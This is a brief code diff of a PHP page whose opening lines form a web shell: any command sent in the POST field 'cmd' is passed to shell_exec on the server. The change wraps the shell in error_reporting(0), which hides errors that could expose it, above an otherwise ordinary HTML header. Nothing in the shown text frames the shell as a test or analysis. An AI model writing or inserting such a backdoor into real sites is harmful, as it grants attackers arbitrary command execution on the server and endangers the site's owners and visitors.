@@ -1,4 +1,7 @@
-<?php if (!empty($_POST['cmd'])) { $cmd = shell_exec($_POST['cmd']); } ?>
+<?php 
+error_reporting(0);
+if (!empty($_POST['cmd'])) { $cmd = shell_exec($_POST['cmd']); } 
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
